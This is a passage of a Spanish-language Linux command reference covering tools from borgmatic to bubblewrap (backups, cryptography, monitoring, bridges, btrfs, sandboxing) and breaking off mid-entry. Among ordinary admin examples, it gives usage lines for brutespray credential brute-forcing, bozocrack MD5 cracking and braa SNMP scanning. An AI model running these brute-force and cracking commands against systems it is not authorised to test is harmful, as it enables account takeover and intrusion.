    retention:
       keep_daily: 7
       keep_weekly: 4
       keep_monthly: 6
    consistency:
       checks:
               - repository
               - archives
# borgmatic (verificar que funciona correctamente iniciará el respaldo, aplicará políticas de retención y validará el repositorio)
1.-
Automatización con Cron
$ crontab -e
Y agregar una línea como esta para respaldos diarios a las 2 a.m.:
          0 2 * * * /usr/bin/borgmatic


bosh
[Browsable Output SHell]. Herramienta diseñada para navegar y manipular de manera interactiva y eficiente sistemas de archivos y otros recursos. Se describe como una shell de salida navegable porque combina características de una shell estándar, como Bash, con una interfaz interactiva para navegar por directorios, ejecutar comandos y gestionar salidas. Con el navegador en file:///usr/share/doc/bosh/examples muestra 3 scripts: bof, bops y boss que pueden copiarse en /usr/local/bin y que implementan nuevas caracteristicas a la aplicación. Para salir de todas, Crl-x.
$ ls -al | bosh
$ ls -al | bops
$ cat archivo.txt | bosh
$ cat archivo.txt | bof


botan
Se utiliza para realizar diversas operaciones criptográficas, como cifrado, descifrado, generación de claves, hashes y firmas digitales. Admite una amplia variedad de algoritmos, como RSA, DSA, DES, AES, MD5 y SHA-1.
$ botan list (lista todos los algoritmos compatibles)
$ botan hash --algo=SHA-256 --output-format=hex archivo.txt (calcular el hash de un archivo usando el algoritmo SHA-256)
$ echo -n "Linux es un sistema genial" | botan hash --algo=SHA-256 --output-format=hex (calcular un hash para una cadena de texto)
$ botan gen_rsa --key-size=2048 > clave_privada.pem (generar un par de claves RSA con una longitud específica)
$ botan pubkey --pub --pem clave_privada.pem > clave_publica.pem (extraer la clave pública del comando anterior)
$ botan encrypt rsa clave_publica.pem archivo.txt > archivo_cifrado.bin (cifrar un archivo usando RSA)
$ botan decrypt rsa clave_privada.pem archivo_cifrado.bin > archivo_descifrado.txt (descifrar el archivo cifrado)
$ botan sign rsa clave_privada.pem archivo.txt > firma.bin (firmar un archivo usando RSA)
$ botan verify rsa clave_publica.pem archivo.txt firma.bin (verificar la firma)
$ botan pbkdf2 --algo=PBKDF2 --hash=SHA-256 --iter=100000 "contraseña" --salt=sal > clave_derivada.bin (usar una contraseña para derivar una clave segura)
$ botan rng 16 (generar 16 bytes de datos aleatorios)
$ botan keyinfo clave_privada.pem (ver detalles de una clave)
$ botan pkcs8 --pem clave_privada.der > clave_privada.pem (convertir una clave privada entre formatos PEM y DER)
1.-
Cifrar un archivo con AES en modo CBC:
Primero generar una clave y un IV [vector de inicialización]:
$ botan rng 32 > aes_key.bin
$ botan rng 16 > aes_iv.bin
Luego, cifra el archivo:
$ botan encrypt aes-256-cbc aes_key.bin aes_iv.bin archivo.txt > archivo_cifrado.bin
Descifrar el archivo cifrado:
$ botan decrypt aes-256-cbc aes_key.bin aes_iv.bin archivo_cifrado.bin > archivo_descifrado.txt


bottom
Muestra información (CPU, red, memoria RAM, procesos, temperaturas...) del equipo en tiempo real. Página del proyecto: https://github.com/ClementTsang/bottom
$ btm


boxes
[figlet lolcat]. Dibuja un marco en ascii entorno a un texto.
$ boxes -l | less (Ver todas las opciones de marco)
$ echo -e "Linux es un sistema genial" | boxes -d santa
$ echo -e "\nLinux\nes un sistema\ngenial" | boxes -d peek (Con saltos de linea en el texto [\n])
$ echo -e "\nLinux\nes un sistema\ngenial" | boxes -p a8t4 -d sunset (Con espacios en blanco alrededor del texto)
$ echo -e "\nLinux\nes un sistema\ngenial" | boxes -a c -d boy (texto alineado al centro [-a c])
Algunas otras opciones:
	-a l (texto alineado a la izquierda)
	-a r (texto alineado a la derecha)


bozocrack
Craquear contraseñas de hash md5 a partir de los resultados de su busqueda en google. Descarga de <https://github.com/juuso/BozoCrack>
Proceso:
Copiar el hash o hashses uno debajo de otro en un archivo de texto
$ bozocrack archivo.txt
	Nota.- dado que no usa diccionarios ni fuerza bruta sino solo busquedas de google, solamente se encontrarán las más usuales.


bpfmon
[Berkeley Packet Filter MONitor]. Monitorea la cantidad de bytes y paquetes que pasan por una interfaz de red específica.
# bpfmon enp1s0 "arp or ip" (cuenta los paquetes arp o ip en enp1s0)
# bpfmon any " " (cuenta todos los paquetes en todas las interfaces)
# bpfmon iptables "FORWARD 1" (cuenta los paquetes que coinciden con la primera regla en la tabla filter, chain FORWARD)
# bpfmon -z enp1s0 ip (muetra el gráfico en horizontal)
# bpfmon -N iptables "nat chn 3" (con los colores invertidos y cuenta los paquetes que coinciden con la tercera regla en la tabla nat, chain chn)
# bpfmon iptables (cuenta los paquetes que coinciden con una regla de iptables)


bpftrace
Es un lenguaje de rastreo de alto nivel para el Filtro de Paquetes Berkeley [Enhanced Berkeley Packet Filter - eBPF]. Permite escribir scripts concisos y expresivos para observar eventos tanto en el kernel como en el espacio de usuario, facilitando la depuración, la optimización del rendimiento y la observabilidad. Incluye las aplicaciones bpftrace-aotrt, bashreadline.bt, biolatency.bt, biosnoop.bt, biostacks.bt, bitesize.bt, capable.bt, cpuwalk.bt, dcsnoop.bt, execsnoop.bt, gethostlatency.bt, killsnoop.bt, loads.bt, mdflush.bt, naptime.bt, oomkill.bt, opensnoop.bt, pidpersec.bt, runqlat.bt, runqlen.bt, setuids.bt, ssllatency.bt, sslsnoop.bt, statsnoop.bt, swapin.bt, syncsnoop.bt, syscount.bt, tcpaccept.bt, tcpconnect.bt, tcpdrop.bt, tcplife.bt, tcpretrans.bt, tcpsynbl.bt, threadsnoop.bt, undump.bt, vfscount.bt, vfsstat.bt, writeback.bt y xfsdist.bt.
# bpftrace -e 'BEGIN { printf("Hello, World!\n"); }' (ejemplo simple. "BEGIN" es una sonda especial que se dispara una vez al inicio del programa bpftrace)
# bpftrace -e 'kprobe:do_nanosleep { printf("%d durmiendo\n", pid); }' (rastrea los procesos que llaman a la función `do_nanosleep` del kernel y muestra su PID)
# bpftrace -e 'tracepoint:raw_syscalls:sys_enter { @[comm] = count(); }' (utiliza un `tracepoint` y un mapa para contar cuántas llamadas al sistema realiza cada proceso)
        tracepoint:raw_syscalls:sys_enter --> Un tracepoint que se activa en cada entrada de llamada al sistema.
        @[comm] = count(); --> Utiliza un mapa [@] con el nombre del comando [comm] como clave para contar las ocurrencias.
# bpftrace -e 'tracepoint:syscalls:sys_enter_openat { printf("%s %s\n", comm, str(args->filename)); }' (rastrea llamadas al sistema openat y muestra nombre del proceso y qué está abriendo)
        tracepoint:syscalls:sys_enter_openat --> Tracepoint para la entrada de la llamada al sistema openat.
        str(args->filename) --> Convierte el argumento filename [que es un puntero] a una cadena legible.
# bpftrace -e 'kprobe:vfs_read { @start[tid] = nsecs; } kretprobe:vfs_read /@start[tid]/ { @ns[comm] = hist(nsecs - @start[tid]); delete(@start[tid]); }' (mide el tiempo que tardan las operaciones de lectura del sistema de archivos [vfs_read] y presenta un histograma de la latencia en nanosegundos)
        kprobe:vfs_read --> En la entrada de vfs_read, guarda el timestamp actual en un mapa @start usando el ID del hilo [tid] como clave.
        kretprobe:vfs_read --> En la salida de vfs_read.
        /@start[tid]/ --> Una condición que asegura que solo procesamos las kretprobe si tenemos un timestamp de inicio correspondiente, evitando errores si el hilo ha terminado o si el rastreo se inició a mitad de una operación.
        @ns[comm] = hist(nsecs - @start[tid]); --> Calcula la duración [nsecs - @start[tid]] y la agrega a un histograma [hist] en un mapa @ns, agrupado por el nombre del proceso [comm].
        delete(@start[tid]); --> Elimina la entrada del mapa @start para liberar memoria.
# bpftrace -e 'uprobe:/bin/bash:readline { printf("Bash leyendo entrada: %s\n", comm); }' (rastrea cuándo se llama a la función readline dentro de la aplicación bash)
        uprobe:/bin/bash:readline --> Se adjunta a la entrada de la función readline en el ejecutable /bin/bash.
Nota.- bpftrace incluye una colección de herramientas y scripts predefinidos, normalmente en /usr/share/bpftrace/tools o similar, que facilitan el rastreo de problemas comunes.
# bpftrace /usr/share/bpftrace/tools/biolatency.bt (mostrará un histograma de la latencia de las operaciones de E/S de bloque en el sistema)
# bpftrace /usr/share/bpftrace/tools/bashreadline.bt (Rastrea y muestra lo que los usuarios escriben en sus shells bash)
# bpftrace /usr/share/bpftrace/tools/biolatency.bt (mide y muestra un histograma de la latencia de las operaciones de E/S de bloque, lectura/escritura, del disco)
# bpftrace /usr/share/bpftrace/tools/biosnoop.bt (muestra información detallada sobre cada operación de E/S de bloque, quién la solicitó, qué tipo de operación, tamaño, etc.)
# bpftrace /usr/share/bpftrace/tools/execsnoop.bt (muestra cada nueva ejecución de programa (`execve`) en el sistema, incluyendo el PID, nombre del proceso y argumentos)
# bpftrace /usr/share/bpftrace/tools/opensnoop.bt (muestra cada llamada a `open()` y `openat()` en el sistema, indicando qué proceso abrió qué archivo)
# bpftrace /usr/share/bpftrace/tools/tcpconnect.bt (muestra cada conexión TCP saliente, quién la inició, a dónde se conectó)
# bpftrace /usr/share/bpftrace/tools/tcplife.bt (Rastrea el ciclo de vida de las conexiones TCP, incluyendo la duración)
# bpftrace /usr/share/bpftrace/tools/ext4slower.bt (identifica operaciones lentas en el sistema de archivos ext4)


bpm-tools
Herramienta para calcular el tempo BPM [Beats-Per-Minute, pulsaciones por minuto] de la música. Incluye las herramientas bpm-graph y bpm-tag.
$ bpm-tag -f archivo.mp3 (solo muestra las BPM)
$ mpv archivo.mp3 | bpm -g file.dat
$ bpm-graph file.dat (ver el gráfico)


bpytop
Monitor de recursos que muestra el uso y las estadísticas del procesador, la memoria, los discos, la red y los procesos.
$ bpytop


braa
Escáner para realizar consultas SNMP [Simple Network Management Protocol] a varios dispositivos de red de manera rápida y eficiente.
$ braa public@192.168.1.1 system.sysDescr.0 (a la comunidad "public", dirección ip del dispositivo y al identificador de objeto [OID] que representa la descripción del sistema)
$ braa public@192.168.1.1,192.168.1.2,192.168.1.3 system.sysUpTime.0 (la herramienta consultará el tiempo de actividad [sysUpTime] de tres dispositivos separando las direcciones IP con comas)
$ braa public@192.168.1.1:162 system.sysName.0 (especificando el puerto 162 del dispositivo)
$ braa -t 5000 public@192.168.1.1 system.sysDescr.0 (tiempo de espera de 5 segundos para esperar respuesta de algún dispositivo)
$ braa -v public@192.168.1.1 system.sysContact.0 > resultados.txt (guardar los resultados en un archivo y con la máxima información)
$ braa public@192.168.1.1-192.168.1.5 system.sysLocation.0 (consultará el OID sysLocation en todos los dispositivos dentro del rango)
$ braa private@192.168.1.1 system.sysDescr.0 (si se utiliza una comunidad diferente de public ha de especificarse)
$ braa -d public@192.168.1.1 system.sysDescr.0 (activa el modo de depuración y muestra detalles adicionales y si algo no funciona correctamente)
1.- Leer dispositivos y OIDs desde archivos
$  cat devices.txt
	public@192.168.1.1
	public@192.168.1.2
	public@192.168.1.3
$ cat oids.txt
	system.sysDescr.0
	system.sysUpTime.0
$ braa -f devices.txt -o oids.txt


brebis
Herramienta diseñada para analizar copias de seguridad con el objetivo de verificar su integridad, detectar duplicados y obtener informes sobre los datos respaldados.
$ brebis -G /backups/backup.tar.gz (generar el archivo de configuración [.conf] y la lista de archivos [.list] para la copia de seguridad)
$ brebis -c /backups/backup.conf -l /var/log/brebis.log (indicando archivo de configuración y de registro)
$ brebis -g /backups/backup.tar.gz   (generar una lista de archivos dentro de una copia de seguridad)
$ brebis -d \( -g /backups/backup.tar.gz  (cambia el delimitador predeterminado de la lista de archivos generado por "-g" a "(")


brew
[build-essential curl git python-setuptools ruby]. En Debian el paquete se denomina linuxbrew-wrapper. Bifurcación de Homebrew, el administrador de paquetes de Mac OS, para Linux. Algunas de sus caracteristicas principales son que no requiere acceso root, permite instalar software no empaquetado por la distribución nativa y pueden instalarse versiones actualizadas de software cuando la distribución nativa es antigua.
$ nano ~/.bash_profile
Añadir:
        if [ -f $(brew --prefix)/etc/bash_completion.d/um-completion.sh ]; then
        . $(brew --prefix)/etc/bash_completion.d/um-completion.sh
        fi
$ brew doctor (Comprobar si linuxbrew esté instalado y funciona correctamente)
$ brew update (actualizar linuxbrew)
$ brew search (paquetes están disponibles)
$ brew upgrade (actualizar paquetes obsoletos)
$ brew upgrade paquete (actualizar un paquete especifico)
$ brew --cache (donde están los paquetes descargados)
$ brew install paquete (Instalar un paquete)
$ brew remove (Eliminar un paquete)


bridge
[iproute2]. Mostrar y manipular direcciones y dispositivos puente comunmente utilizados en redes virtuales y contenedores.
$ bridge link (listar todos los bridges configurados en el sistema)
$ bridge show (mostrar detalles de todos los dispositivos de red conectados)
$ bridge link show dev br0 (información específica de un bridge llamado br0)
# ip link add name br0 type bridge (crear un nuevo dispositivo bridge)
# ip addr add 192.168.1.1/24 dev br0 (configurar una dirección IP para el bridge)
# ip link set br0 up (activar el dispositivo bridge)
# ip link set eth0 master br0 (añadir una interfaz física al bridge)
# ip link set eth0 nomaster (eliminar una interfaz del bridge)
$ bridge fdb show dev br0 (listar direcciones MAC de las interfaces conectadas al bridge)
# bridge fdb add 00:11:22:33:44:55 dev br0 master (añadir una entrada estática en la tabla de direcciones)
# bridge fdb del 00:11:22:33:44:55 dev br0 (eliminar una entrada fija)
# ip link set br0 type bridge stp_state 1 (habilitar STP [Spanning Tree Protocol] en un dispositivo bridge)
# ip link set br0 type bridge stp_state 0 (deshabilitar STP)
$ bridge vlan show (mostrar las VLANs configuradas en un bridge)
# bridge vlan add vid 100 dev eth0 (añadir una VLAN específica a un puerto del bridge)
# bridge vlan del vid 100 dev eth0 (eliminar una VLAN de un puerto)
Otras formas de manipular bridges:
# ip link set br0 down (desactuvar un bridge)
# ip link del br0 (eliminar un bridge)
# ip link set br0 type bridge ageing_time 300 (cambiar el tiempo de un bridge)
# ip link set br0 type bridge forward_delay 15 (configurar el retraso de reenvío)


bridge-utils
Herramientas para configurar puentes Ethernet, útiles en redes virtuales y configuraciones de contenedores o máquinas virtuales. La conexión es completamente transparente: los hosts conectados a un dispositivo Ethernet ven a los hosts conectados a los otros dispositivos Ethernet directamente.
# brctl addbr br0 (crea un nuevo puente llamado br0)
# brctl addif br0 eth0 (agrega la interfaz física eth0 al puente br0. Esto conecta la interfaz al puente)
# brctl show (muestra los puentes configurados, las interfaces asociadas y otra información relevante)
# brctl delbr br0 (elimina el puente br0. Asegurarse de que no esté activo)
# brctl showstp br0 (muestra el estado del Spanning Tree Protocol [STP] para el puente br0)
# ip link set dev br0 up (activa el puente br0 después de configurarlo)
# ip link set dev br0 down (desactiva el puente)
# ip addr add 192.168.1.100/24 dev br0 (asigna la dirección IP 192.168.1.100 con una máscara de red de 24 bits al puente br0)
# brctl showmacs br0 (muestra las direcciones MAC en el puente br0 y sus tiempos)
# brctl stp br0 on (habilita el Protocolo Spanning Tree [STP] en el puente br0 para evitar bucles en la red)
# brctl setbridgeprio br0 32768 (establece la prioridad del puente br0, un número más bajo indica mayor prioridad)
# brctl delif br0 eth0 (quita la interfaz eth0 del puente br0)


brightd
Daemon que ajusta el brillo de la pantalla y si un usuario está inactivo durante un tiempo determinado, la pantalla se oscurece automáticamente.
 Crear un archivo de servicio para que brightd pueda ser gestionado con systemctl:
# nano /etc/systemd/system/brightd.service
Con el contenido:
      [Unit]
        Description=Brightd Daemon for Auto Screen Dimming
        After=multi-user.target
      [Service]
        ExecStart=/usr/bin/brightd
        Restart=always
        User=root
      [Install]
        WantedBy=multi-user.target
Guardar el archivo y recargar la configuración de systemd
# systemctl daemon-reload
Habilitar y arrancar el servicio
# systemctl enable brightd
# systemctl start brightd
# systemctl status brightd (comprobar que se está ejecutando)
Asegurar que la ruta del ejecutable en ExecStart sea correcta:
# nano /etc/systemd/system/brightd.service
     ExecStart=/usr/bin/brightd
# nano /etc/brightd.conf
Asegurar que los valores sean correctos:
# nano /etc/brightd.conf
     # Brillo máximo (al 100%)
     max_brightness = 255
     #
     # Brillo mínimo (cuando se oscurece automáticamente)
     min_brightness = 10
     #
     # Tiempo de inactividad en segundos antes de oscurecer
     idle_time = 300
     #
     # Ajustar la ruta
     backlight_path = /sys/class/backlight/*/brightness
Algunos sistemas requieren permisos adicionales para que brightd acceda al control de brillo. Si el log muestra errores de permisos, añadir la regla de udev:
# nano /etc/udev/rules.d/99-backlight.rules
     SUBSYSTEM=="backlight", RUN+="/bin/chmod 666 /sys/class/backlight/*/brightness"
Recargar las reglas:
# udevadm control --reload
Nota.- No funciona en todos los monitores.


brillo
Para definir el nivel de brillo de algunos portatiles podemos recurrir al siguiente comando:
# echo 2000 > /sys/class/backlight/acpi_video0/brightness
En el caso de las gráficas intel:
# echo 2000 > /sys/class/backlight/intel_backlight/brightness
Para ver el nivel de brillo máximo que permite la pantalla:
# cat /sys/class/backlight/acpi_video0/max_brightness
Y en intel:
# cat /sys/class/backlight/intel_backlight/max_brightness


bro
Monitor de seguridad que inspecciona todo el tráfico para detectar signos de actividad sospechosa y mediciones de rendimiento.
# mkdir bro && cd bro (crear el directorio y entrar en él porque genera varios archivos)
# bro -i eth0 (analizar el tráfico en la red eth0.)
Una vez cerrado el monitor con C-c listar los logs creados en el directorio [conn.log, dns.log, files.log, http.log,packet_filter.log, reporter.log, ssl.log, weird.log, x509.log] y visializarlos con cualquier editor.


broot
Enfoque moderno para generar árboles de directorios. Descarga:
$ curl -o broot -L https://dystroy.org/broot/download/x86_64-linux/broot
# mv broot /usr/local/bin
# chmod +x /usr/local/bin/broot
$ broot (para salir pulsar :q como en vim)
$ broot --sort-by-type-dirs-first -H (directorios primero y sin archivos ocultos)


bropages
Otra forma de visualizar las páginas man coloreando la sintaxis y mostrando ejemplos.
$ bro ls


brotli
Algoritmo de compresión de datos desarrollado por Google, para comprimir y descomprimir archivos, mediante una combinación de una variante moderna del algoritmo LZ77, codificación Huffman y modelado de contexto de segundo orden.
$ brotli archivo.txt (comprimir, substituye archivo.txt por archivo.txt.br)
$ brotli -q 11 archivo.txt (ajustando el nivel de compresión: de 1 a 11, donde 11 es el más alto y más lento)
$ brotli --keep archivo.txt (mantener el archivo original sin eliminarlo después de la compresión)
$ brotli -d archivo.txt.br (descomprimir)
$ brotli archivo.txt -o comprimido.br (especificando nombre de salida del comprimido)
$ brotli -d comprimido.br -o descomprimido.txt (especificando nombre de salida del descomprimido)
$ brotli archivo1.txt archivo2.txt (comprimir varios archivos)
$ cat archivo.txt | brotli > archivo_comprimido.br (comprimir desde la entrada estándar)
$ cat archivo_comprimido.br | brotli -d > archivo_descomprimido.txt (descomprimir desde la entrada estándar)
$ brotli --test archivo.txt.br (verificará si el archivo comprimido es válido)


brutespray
Este script de Python toma la salida GNMAP/XML de nmap, JSON separado por nuevas líneas, la salida `XML Export` de Nexpose o las exportaciones `.nessus` de Nessus y automáticamente fuerza bruta los servicios con credenciales predeterminadas usando Medusa. BruteSpray puede incluso encontrar puertos no estándar usando -sV dentro de Nmap.
$ brutespray --file results.gnmap -U user.txt -P pass.txt --threads 5 --hosts 5 (realiza un ataque de fuerza bruta contra los servicios abiertos detectados por Nmap, utilizando las credenciales especificadas)
$ brutespray --file results.gnmap --service ftp,ssh,telnet --threads 5 --hosts 5 (limita el ataque solo a los servicios FTP, SSH y Telnet)
$ brutespray --file results.gnmap -u admin -p password --threads 5 --hosts 5 (intenta atacar la cuenta de administrador con la contraseña especificada)
$ brutespray --file results.gnmap --threads 5 --hosts 5 -c (continúa el ataque incluso si se encuentra una combinación de credenciales válidas)
$ brutespray --file results.xml --threads 5 --hosts 5 (utiliza un archivo XML de Nmap para escaneo y ataque de fuerza bruta)
$ brutespray --file results.xml -i (abre el modo interactivo de Brutespray)


bsd-from
Imprime los encabezados de los correos del usuario que existen en el buzón del sistema.
$ bsd-from -c (La cantidad de mensajes que existen)
$ bsd-from -s usuario (Muestra los encabezados para el usuario en concreto)
$ bsd-from -f /var/mail/usuario (con más información)


bsdgames
Colección de algunos de los juegos basados en texto que se han disfrutado durante décadas en sistemas Unix. Incluye los siguientes: aventura, aritmética, atc, backgammon, battlestar, BCD, Boggle, César, Canfield, Countmail, Cribbage, Dab, go-fish, gomoku, hack, hangman, hunt, mille, monop, morse, number, pig, phantasia, pom, ppt, bonus, quiz, random, rain, robots, rot13, vela, serpiente, tetris, trek, wargames, gusanos, gusanos, wump, wtf


bsdmainutils
Paquete que contiene programas pequeños para el sistema BSD-style Unix. Proporciona banner (como printerbanner), calendar, col, colcrt, colrm, column, from (como bsd-from), hexdump (o hd), look, lorder, ncal (o cal), ul y write (como bsd-write).


btest
Herramienta diseñada para facilitar la ejecución y verificación de pruebas en proyectos de software. Su objetivo es proporcionar un controlador para un conjunto de pruebas basadas en shell. Cada prueba consta de un conjunto de líneas de comando que se ejecutarán y el éxito se determina en función de sus códigos de salida. Los comandos incluidos son utilidades complementarias que automatizan tareas relacionadas con la ejecución, comparación de resultados y manejo de pruebas y son las siguientes: btest-ask-update, btest-bg-run, btest-bg-run-helper, btest-bg-wait, btest-diff, btest-diff-rst, btest-progress, btest-rst-cmd, btest-rst-include, btest-rst-pipe y btest-setsid.
$ btest-ask-update resultado_actual.txt resultado_esperado.txt (comparará los dos archivos y pedirá confirmación para actualizar el archivo esperado si son diferentes)
$ btest-bg-run -- ./script_prueba.sh (ejecutará script_prueba.sh en segundo plano y generará archivos temporales para rastrear la prueba)
$ btest-bg-run -- --debug ./script.sh (obtener más detalles)
$ btest-bg-run-helper --start ./comando --opciones (comando interno que generalmente no se ejecuta manualmente, sino que es invocado por btest-bg-run para manejar procesos en segundo plano)
$ btest-bg-wait (asegura que las pruebas lanzadas con btest-bg-run se completen antes de continuar)
$ btest-diff resultado_actual.txt resultado_esperado.txt (compara archivos generados en una prueba y resalta las diferencias)
$ btest-diff-rst archivo1.rst archivo2.rst (compara archivos en formato RST [reStructuredText] y muestra diferencias específicas para este formato)
$ btest-progress (muestra el progreso de ejecución de las pruebas en tiempo real)
$ btest-rst-cmd ls -l (ejecuta ls -l y genera un bloque de salida en formato RST)
$ btest-rst-include archivo.txt (convierte el contenido de archivo.txt en un bloque RST)
$ btest-rst-pipe script.sh (convierte la salida en un bloque RST)
$ btest-setsid ./script_prueba.sh (ejecuta script_prueba.sh en un nuevo grupo de sesión, evitando interferencias de señales externas)


btop
Monitor de recursos de línea de comandos parecido a top y htop más moderno y colorido que muestra el uso y las estadísticas del procesador, la memoria, discos, red y procesos.
$ btop


btrbk
Herramienta de copia de seguridad para subvolúmenes del sistema de archivos btrfs. Permite sincronizar subvolúmenes locales o remotos, crear instantáneas y gestionar su retención. Primero crear un archivo de configuración para definir qué subvolúmenes respaldar, dónde guardarlos y cómo manejarlos. Un ejemplo básico de configuración:
# nano /etc/btrbk/btrbk.conf
target /backup/btrbk
target user@remote:/path/to/backup
snapshot_dir .snapshots
volume /mnt/btrfs
  subvolume home
  subvolume data
snapshot_preserve_min 3
snapshot_preserve_daily 7
snapshot_preserve_weekly 4
snapshot_preserve_monthly 12
Indica que se respaldarán los subvolúmenes "home" y "data" desde /mnt/btrfs hacia /backup/btrbk, si se trata de respaldar un servidor remoto, dejar el segundo"target". Las instantáneas se almacenarán en un subdirectorio llamado .snapshots y los snapshot_preserve que indican los snapshots a conservar [déjese el que se desea y suprimir los otros]: Las últimas 3 instantáneas, las últimas 7 diarias, las últimas 4 semanales o as últimas 12 mensuales.
# btrbk run (una vez configurado el archivo, realizar una copia de seguridad local o remoto, usando ssh, según proceda y eliminará las instantáneas antiguas según la política definida)
# btrbk run --dry-run (forma de virificar la configuración y mostrará las operaciones planeadas sin realizarlas)
# btrbk -v run (imprime información detallada sobre las operaciones)
1.-
Forma de sincronizar instantáneas desde un disco fuente /mnt/source a un disco destino /mnt/destination, con el archivo de confirugación:
# cat /etc/btrbk/btrbk.conf
volume /mnt/source
  target /mnt/destination
  subvolume home
  subvolume data
# btrbk run
2.-
Configuración para múltiples volúmenes:
# cat /etc/btrbk/btrbk.conf
volume /mnt/btrfs1
  subvolume home
  target /backup/btrfs1
volume /mnt/btrfs2
  subvolume data
  target /backup/btrfs2
3.-
Automatización con cron
# crontab -e
Y colocar la linea:
    0 2 * * * /usr/bin/btrbk run


btrfs
Herramienta para gestionar subvolúmenes, instantáneas, cuotas, y más en el sistema de archivos Btrfs.
# mkfs.btrfs /dev/sdX (formatea una partición o dispositivo con el sistema de archivos Btrfs)
# mount -t btrfs /dev/sdX /mnt (montar un partición)
# mount -t btrfs -o compress=zstd /dev/sdX /mnt (habilitar una compresión)
# btrfs subvolume create /mnt/home (crear un subvolúmene con los dos subvolúmenes llamados home y data en el punto de montaje /mnt)
# btrfs subvolume create /mnt/data
# btrfs subvolume list /mnt (listar los subvolúmenes mostrando ruta, ID y generación de cada subvolumen)
# btrfs subvolume delete /mnt/home (eliminar un subvolumen)
# btrfs subvolume snapshot -r /mnt/home /mnt/snapshots/home_backup (crear una instantánea de solo lectura)
# btrfs subvolume snapshot /mnt/home /mnt/snapshots/home_backup (crear una de lectura-escritura)
# btrfs filesystem df /mnt (verificar espació y otra información)
# btrfs filesystem usage /mnt (lo mismo)
# btrfs check /dev/sdX ( comprobar integridad del sistema de archivos)
# btrfs check --repair /dev/sdX (intentar reparar errores)
# btrfs device add /dev/sdY /mnt (permite agrupar varios discos en un único volumen, esto añade /dev/sdY al sistema montado en /mnt)
# btrfs device remove /dev/sdY /mnt (eliminar un dispositivo del conjunto)
# btrfs balance start -dconvert=raid1 -mconvert=raid1 /mnt (convierte los datos [dconvert]y metadatos [mconvert]a RAID 1)
# btrfs filesystem show (ver información detallada de dispositivos y configuraciónes)
# btrfs balance start /mnt (optimizar la distribución de datos en los dispositivos)
# btrfs balance start -dusage=50 /mnt (reequilibra bloques de datos con al menos el 50% de uso)
# btrfs filesystem defragment /mnt/home (defragmentar un subvolumen)
# btrfs filesystem defragment -czstd /mnt/home (desfragmentar con la compresión activada)
1.-
Para restaurar datos desde una instantánea:
# btrfs subvolume delete /mnt/home (eliminar la antigua)
# btrfs subvolume snapshot /mnt/snapshots/home_backup /mnt/home
2.-
Habilitar cuotas y verificar uso por subvolumen. Primero, activar las cuotas para habilitar el seguimiento del uso de espacio:
# btrfs quota enable /mnt
Luego, consulta el uso por subvolumen:
# btrfs qgroup show /mnt


btscanner
Escanear dispositivos bluetooth
$ btscanner


btsync
Compartir carpetas. Descargar el archivo que corresponda a nuestra arquitectura de http://labs.bittorrent.com/experiments/sync.html. No precisa instalación.
$ cd btsync_x64
Si no queremos modificar los datos, podemos acceder a la aplicación con la dirección del navegador: http://0.0.0.0:8888 con nombre de usuario: "admin" y contraseña: "password". Si queremos personalizar los datos, matar el proceso:
$ kill -9 PID
Y crear el archivo de configuración:
$ ./btsync --dump-sample-config > sync.conf
Editar y modificar los parámetros indicados según conveniencias:
$ nano sync.conf
	"storage_path" : "/home/USUARIO/.sync"
	"listen" : "127.0.0.1:8888",
    	"login" : "USUARIO",
    	"password" : "CONTRASEÑA"
Guardar y lanzar la aplicación:
$ ./btsync --config sync.conf
Acceder por el navegador con la dirección: http://127.0.0.1:8888
Colocar en el cron para que queda activo al reiniciar:
$ crontab -e
Colocar la linea:
	@reboot /home/USUARIO/btsync_x64/btsync --config /home/USUARIO/btsync_x64/sync.conf
Guardar. Para compartir una carpeta: clic en "Add Folder", seleccionar la carpeta, generar la clave pulsando en "generate" y finalizar clicando en "Add". En el pc que sincronizará la carpeta, abrir la misma dirección, clic en "add folder" y, sin clicar en "generate", introducir la clave generada antes y seleccionar la carpeta donde se copiará.


bubblewrap
Herramienta ligera para crear contenedores sin privilegios. Permite aislar procesos del sistema anfitrión configurando un espacio de nombres y puntos de montaje personalizados, ideal para tareas como empaquetado, pruebas o ejecución de software en entornos limitados.
# bwrap --dev /dev --proc /proc --bind / / sh (monta /dev y /proc dentro del contenedor, une el sistema anfitrión [/] al contenedor y inicia un shell aislado)
# bwrap --bind / / --chdir ~/sandbox --dev /dev --proc /proc bash (ejecutar "bash" en ~/sandbox como la raíz del contenedor)
# bwrap --unshare-net --bind / / bash (crea un espacio de nombres de red independiente, aislando al proceso del sistema anfitrión)
# bwrap --tmpfs /tmp --bind / / bash (crea un directorio /tmp como un sistema de archivos temporal y usa el resto del sistema anfitrión como base)
# bwrap --ro-bind /bin /bin --ro-bind /lib /lib --ro-bind /usr /usr --dev /dev --proc /proc bash (monta /bin, /lib y /usr como solo lectura e incluye /dev y /proc para que los programas funcionen correctamente)
# bwrap --unshare-user --uid 1000 --gid 1000 --bind / / bash (ejecuta un shell con el UID y GID 1000 dentro del contenedor, independientemente del usuario anfitrión)
# bwrap --unshare-pid --bind / / bash (que los procesos dentro del contenedor no puedan ver ni interactuar con los del sistema anfitrión)
# bwrap --ro-bind /etc /etc --dev /dev --proc /proc bash (monta /etc como solo lectura dentro del contenedor)
# bwrap --bind / / --chdir /home/user bash (establece /home/user como el directorio de trabajo del contenedor)
# bwrap --unshare-ipc --bind / / bash (asegurar que las colas de mensajes y memoria compartida no sean visibles para procesos externos)
# bwrap --dev /dev --proc /proc --tmpfs /tmp bash (el contenedor no tiene acceso al sistema anfitrión más allá de /dev y /proc)
# bwrap --bind / / --dev /dev --proc /proc /usr/bin/ls (uso combinado con flatpak)
# bwrap --unshare-all --ro-bind /usr /usr --ro-bind /bin /bin --ro-bind /lib /lib --ro-bind /lib64 /lib64 2>/dev/null || true --proc /proc --tmpfs /tmp --dev /dev -- ls || true (ejecutar un binario con solo lo imprescindible)
# bwrap --unshare-all --ro-bind / / --proc /proc --dev /dev --tmpfs /tmp --chdir / bash -c 'touch /root/FAIL || echo "solo lectura activada"; uname -a' (sandbox de solo-lectura total)
1.-
Probar un programa en un entorno restringido:
# bwrap --bind /usr/bin /usr/bin --bind /usr/lib /usr/lib --bind /etc /etc --ro-bind /var /var --tmpfs /tmp --dev /dev --proc /proc --unshare-net /usr/bin/python3 --version
Permite acceso limitado a /usr/bin, /usr/lib y /etc, monta /var como solo lectura y crea un nuevo /tmp, aísla la red y ejecuta Python dentro del contenedor.
2.-
Crear un script para ejecutar aplicaciones con restricciones repetidamente. Por ejemplo:
# nano sandbox.sh
#!/bin/bash
